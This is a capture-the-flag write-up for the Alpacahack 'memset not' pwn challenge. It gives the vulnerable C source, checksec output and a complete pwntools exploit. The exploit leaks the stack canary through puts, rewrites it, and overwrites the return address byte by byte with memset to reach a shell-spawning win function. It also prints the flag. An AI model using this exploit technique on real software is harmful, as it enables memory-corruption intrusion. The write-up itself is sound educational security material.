---
author: "nothoudaifa"
title: "memset not chall from Alpacahack B-Side writeup"
date: "2026-07-01"
tags: 
- ctf 
- pwn
---


## Initial Analysis
we are given this source code of the binary:
```c
// gcc -o chal main.c -fno-pie -no-pie
#include <stdio.h>
#include <string.h>
#include <unistd.h>


void win() {
    execve("/bin/sh", NULL, NULL);
}

int main(void) {
    unsigned n = 0;
    char c = 0;
    char buf[100] = {0};
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    while (1) {
        printf("size > ");
        scanf("%u", &n);
        if (n == 0) break;
        printf("char > ");
        scanf(" %c", &c);
        memset(buf, c, n);
        puts(buf);
    }
    return 0;
}
```

there is a buffer overflow in the memset function since we can set an arbitrary size n and use it to memset beyond `buf` into the return address, and there is also a win function we can redirect execution flow into.

running `checksec` on the binary we can see that stack canary is enabled and pie is disabled:
```bash
$ checksec ./chal
[*] '/home/player/ctfs/alpaca/memset-note/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```


## Exploitation
first things first we need to leak the canary, there is a `puts(buf)` after we do the memset, so we can fill all the memory from `buf` to `address of the canary` with A's and then puts will print the our buf and the canary, note that we need to also write in the first byte of the canary since it's always 0, it's used to terminate strings in case a non-null terminated buffer is situated just before the canary is printed so it cannot leak the canary 

we can use something like this:
```python
from pwn import *
p = process("./chal")


def snd(sz, c):
    p.sendlineafter(b'size >', str(sz).encode())
    p.sendlineafter(b'char >', b' '+c)

snd(0x69, b'a') # offset between buf and canary+1 is 0x69
p.recvuntil(b'a'*0x69)
canary = u64(b'\x00'+p.recvn(7))
```

now we need to write into the return address, to do that using `memset` we will have to write the value backwards that is if you want for example to write b'abcd' into an address you do:
```c
memset(address, 'd', 4) // address === b'dddd'
memset(address, 'c', 3) // address === b'cccd'
memset(address, 'b', 2) // address === b'bbcd'
memset(address, 'a', 1) // address === b'abcd'
```

i made a python function that does this using memsets:
```python
def writeval(val, offset):
    val = p64(val)
    for i in range(7, -1, -1):
        snd(offset+i+1, p8(val[i]))
```

using this function we can write the address of win into the return address and we have to also rewrite the address of the stack canary since we overwrite it when we write into the retaddr.

here is the final exploit:
```python
from pwn import *

# p = process("./chal")

def snd(sz, c):
    p.sendlineafter(b'size >', str(sz).encode())
    p.sendlineafter(b'char >', b' '+c)

def writeval(val, offset):
    val = p64(val)
    for i in range(7, -1, -1):
        snd(offset+i+1, p8(val[i]))

snd(0x69, b'a')
p.recvuntil(b'a'*0x69)
canary = u64(b'\x00'+p.recvn(7))

writeval(0x4011f6, 0x78)

writeval(canary, 0x68)

p.sendline(b'0') # send 0 to return from main

p.interactive()
```

running it we get the flag: `Alpaca{5anta_ch3ck5_y0ur_c4n4ry_tw1c3}`